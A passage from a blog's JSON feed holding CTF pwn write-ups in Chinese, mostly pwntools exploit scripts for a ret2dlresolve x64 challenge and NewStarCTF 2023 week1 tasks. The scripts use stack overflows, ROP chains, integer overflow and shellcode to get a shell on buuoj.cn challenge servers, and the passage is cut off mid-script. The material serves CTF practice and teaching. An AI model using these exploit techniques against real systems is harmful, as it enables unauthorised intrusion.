punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697345292324-9f473332-0ea0-4ed9-8936-384b29581eab.png\" alt=\"getshell\"></p>\n<h1 id=\"dlresolve-x2\"><a class=\"markdownIt-Anchor\" href=\"#dlresolve-x2\">#</a> *dlresolve x2</h1>\n<p>ret2dlresolve x64</p>\n<blockquote>\n<p>这边有个血的教训，就是利用 patchelf 修改 libc 文件后，elf 文件本身会变动，尤其是.dynamic 段的数据。这时候远程做题的时候不能再用改过的文件提取地址，或者利用其构造 Ret2dlresolvePayload，不然就会像我一样本地周三就打通了，远程失败的原因周六才找到。所以源文件备份后再 patchelf 吧。<br>\n<img data-src=\"./1697347817238-3075fcdc-2ab8-4877-ae0a-fc5d8cf25e1e.png\" alt=\"原文件\"><img data-src=\"./1697347868215-c34f0bbd-cc3c-4f21-94b7-dc072c661273.png\" alt=\"patchelf修改libc后\"></p>\n</blockquote>\n<p>这题没有输出函数，无法通过泄露地址然后进行 ret2libc。所以如题目所说，利用 <code>_dl_runtime_resolve()</code>  函数来调用 <code>system()</code> 。<br>\n检查保护，这题 Relro 为 Partial RELRO 保护，因此.dynamic 段不可修改，漏洞利用方式就是伪造 jmprel, dynsym, dynstr 等数据段。<br>\n<img data-src=\"./1697284934871-6acb3b5d-f294-49fe-8b93-d048a3ad94aa.png\" alt=\"image.png\"><br>\n 存在栈溢出漏洞，在溢出后利用 <code>read()</code>  函数在 0x404000~0x405000 可读写段伪造 Elf64_Rela, Elf64_Sym 等数据块。然后构造 system 函数的参数。最后在放入 reloc_offset，跳转到 plt [0] 处以执行 <code>_dl_runtime_resolve()</code> （其实是先放入 plt [0] 地址再放入 reloc_offset）。<br>\n在伪造数据的同时连同 system 符号和 <code>&quot;/bin/sh\\0&quot;</code>  字符串一并输入进去，用于 <code>_dl_runtime_resolve()</code>  链接函数以及 <code>system()</code>  调用参数。<br>\n<img data-src=\"./1697285151451-f1f10b2e-6a90-4bf1-9bf3-062d7905b7b6.png\" alt=\"image.png\"></p>\n<h2 id=\"利用pwntools\"><a class=\"markdownIt-Anchor\" href=\"#利用pwntools\">#</a> 利用 pwntools</h2>\n<p>这题用 pwntools 直接如下书写。由于没有输出函数，所以两段输入中间用延时区分，或者让第一段输入填充至 100 字符也可（调试时我加入了 <code>input()</code> ，如果没加那么延时分隔不开两段输入）。<br>\n最后执行 <code>system()</code>  时会中止在以下汇编指令。<br>\n<img data-src=\"./1697288473408-0839f093-3617-4809-bc26-d17106d45434.png\" alt=\"image.png\"><br>\n 该命令检查栈有没有对齐，若执行该汇编指令时 rsp 末尾不为 0 会报错。因此在 payload 中加入一个 ret，刚好 8 字节。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dlresolve <span class=\"token operator\">=</span> Ret2dlresolvePayload<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">,</span> symbol<span class=\"token operator\">=</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29599</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#p = process('./pwn')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x70</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rop<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> dlresolve<span class=\"token punctuation\">.</span>data_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rop<span class=\"token punctuation\">.</span>ret2dlresolve<span class=\"token punctuation\">(</span>dlresolve<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>raw_rop <span class=\"token operator\">=</span> rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>raw_rop<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>dlresolve<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"手写步骤\"><a class=\"markdownIt-Anchor\" href=\"#手写步骤\">#</a> 手写步骤。</h2>\n<p><code>_dl_runtime_resolve()</code>  是靠字符串解析函数的，因此若传入的字符串为 <code>&quot;system&quot;</code> ，那么便能将当前函数解析为 system 函数。而在某个函数第一次调用时（假设是 read 函数），是往栈中 push 了 read 函数所对应的 Elf64_Rela 与 JMPREL 段的<strong>引索</strong>。跳到 plt [0] 后再 push 了 got [0] 的值，也就是 push 了 link_map 的值，随后调用 <code>_dl_runtime_resolve()</code>  进行函数链接。<br>\n因此我们在栈溢出 payload 中需要调用函数的地方放入 plt [0]，随后放入一个引索值，便可解析任何我们想要的函数。<br>\n然后剩下的就是要构造 Elf64_Rela。</p>\n<p>首先选择一段内存用于伪造数据。我这里选择了 0x404500 的位置。<br>\nElf64_Rela 有 3 个成员，其中 r_offset 是该函数 got 表绝对位置。r_info 最左边为函数的 Elf64_Sym 在 symtab 中的<strong>索引</strong>。最低位固定为 7。<br>\n<img data-src=\"./1697287017094-1b28d048-ac63-4adc-993e-19f76268bc84.png\" alt=\"image.png\"><br>\nElf64_Rela 结构体占用 0x18 个字节，所以 fakeRel 的位置与 jmprel 的差要为 0x18 的倍数，这里取 0x404520。在调用 <code>_dl_runtime_resolve()</code>  时需放入该索引，即 <code>reloc_index = (elfRel - jmprel) // 0x18</code> 。r_offset 随便取一个，因为不需要第二次调用，这边取 0x404700。Elf64_64 将要放在 0x404550 的地方，所以 r_info 的值为 <code>((elfSym - symtab) // 0x18) &lt;&lt; 0x20 | 0x7</code> 。</p>\n<p>而对于 Elf64_Sym，其有 6 个成员，其中 st_name 是函数名称字符串的地址占 32 位。第二个参数如果函数为外部函数，则均为 0x12，占 8 位（其实直接设置为 0 应该也可以的）。其他 4 个成员均为 0，分别占 8,16,64,64 位。总共 3 字长，24 字节，所以上一步的引索是地址偏移除以 0x18。<br>\nst_name 取 system 字符串的地址，这边为 0x404590。第二个参数设为 0x12。其他为 0。<br>\n<img data-src=\"./1697287090552-a7de1dff-6ae6-42b1-957d-f49fcc49678c.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697289692026-050491a4-5d1b-4c2d-8b20-7a754744519c.png\" alt=\"image.png\"><br>\n 随后在 0x404590 的地方输入 <code>&quot;system&quot;</code> ，在 0x404580 的地方输入 <code>&quot;/bin/sh\\0&quot;</code> 。然后将这四部分组成一个 payload，用 read 函数输入到 0x404500 的地方。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29599</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p = process('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>strtab <span class=\"token operator\">=</span> <span class=\"token number\">0x400458</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>symtab <span class=\"token operator\">=</span> <span class=\"token number\">0x4003c8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>jmprel <span class=\"token operator\">=</span> <span class=\"token number\">0x400518</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x404500</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elfSym <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>elfRel <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>binsh <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x80</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>elfStr <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x90</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>elfRel <span class=\"token operator\">-</span> jmprel<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>elfSym <span class=\"token operator\">-</span> symtab<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>reloc_index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>elfRel <span class=\"token operator\">-</span> jmprel<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>r_offset <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>r_info <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>elfSym <span class=\"token operator\">-</span> symtab<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">|</span> <span class=\"token number\">0x7</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>main_a <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>plt_init <span class=\"token operator\">=</span> <span class=\"token number\">0x401020</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>rop<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#rop.setbuf(1, data+0x500)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>rdi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>binsh<span class=\"token punctuation\">,</span> plt_init<span class=\"token punctuation\">,</span> reloc_index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>fakeRel <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>r_offset<span class=\"token punctuation\">,</span> r_info<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>fakeSym <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>elfStr <span class=\"token operator\">-</span> strtab<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>fakeSym <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>elfStr <span class=\"token operator\">-</span> strtab<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>fakebs <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>fakestr <span class=\"token operator\">=</span> <span class=\"token string\">b'system\\0'</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>fakeRel<span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">:</span>fakeSym<span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">:</span>fakebs<span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">:</span>fakestr<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697288799970-7107d330-bc2f-4e0e-afb2-4634faa0a7e8.png\" alt=\"image.png\"></p>\n",
            "tags": [
                "format string",
                "srop",
                "orw",
                "dlresolve"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/10/newstarctf2023-week1-2/",
            "url": "http://waltcsz.github.io/2023/10/newstarctf2023-week1-2/",
            "title": "newstarctf2023_week1-2",
            "date_published": "2023-10-11T17:11:10.000Z",
            "content_html": "<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> week1</h1>\n<h2 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h2>\n<p>ret2text</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./ret2text')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27637</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b ')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span><span class=\"token operator\">+</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x04011FB</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"newstar_shop\"><a class=\"markdownIt-Anchor\" href=\"#newstar_shop\">#</a> newstar_shop</h2>\n<p>整数溢出</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#p=process('./newstar_shop')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25094</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inp</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>inp<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ezshellcode\"><a class=\"markdownIt-Anchor\" href=\"#ezshellcode\">#</a> ezshellcode</h2>\n<p>shellcode x64</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#p=process('./ezshellcode')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25686</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"random\"><a class=\"markdownIt-Anchor\" href=\"#random\">#</a> *Random</h2>\n<p>random ctypes<br>\n 使用 ctypes 可以在 python 中使用 c 语言库函数。<br>\nc 语言的随机是伪随机，使用 srand 决定随机种子。而题目中使用 <code>time(0)</code>  获取当前时间作为随机种子。我们可以进行同样操作，以此生成完全一致的随机数。<br>\n<img data-src=\"./1696841331129-5aa3cc63-bca6-417d-b8c4-1f848942b50c.png\" alt=\"image.png\"><br>\nv8 为第 1 个随机数。在输入与 v8 同样的数字后可进入 if 语句中。<br>\nv3 在取第 2 个随机数模 5 作为下标后，从字符串中获取字符。<br>\nv4 则是取第 3 个随机数模 2 作为下标取字符。<br>\n之后 sy 函数中 v4，v3 分别作为 1，2 个字符组成字符串作为 system 的参数。<br>\n原字符串中可以提出 <code>'$'</code>  和 <code>'0'</code>  组成 <code>&quot;$0&quot;</code> 。因此需要第 2 个随机数模 5 为 2，第 3 个随机数模 2 为 1。循环执行脚本，直到第 2、3 个随机数符合要求。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> 